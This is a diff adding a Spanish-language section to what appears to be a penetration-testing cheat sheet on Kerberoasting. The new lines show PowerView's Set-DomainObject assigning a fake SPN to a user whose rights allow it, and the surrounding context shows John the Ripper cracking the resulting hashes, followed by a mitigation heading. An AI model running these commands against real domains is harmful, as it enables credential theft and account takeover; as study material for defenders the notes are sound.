@@ -5240,6 +5240,15 @@ John The Ripper
 john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
 ```
 
+##### Asignar SPN a un usuario
+
+En caso de tener un permiso como `GenericAll` o `GenericWrite` lo que podemos hacer es Asignar un SPN falso a la cuenta de usuario para luego obtener el hash devuelte por TGS-REP y crackearlo.
+
+```powershell
+Import-module .\PowerView.ps1
+Set-DomainObject -Identity <USER> -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+```
+
 ##### Mitigación del ataque Kerberoasting
 
 - Utilizar contraseñas robustas.
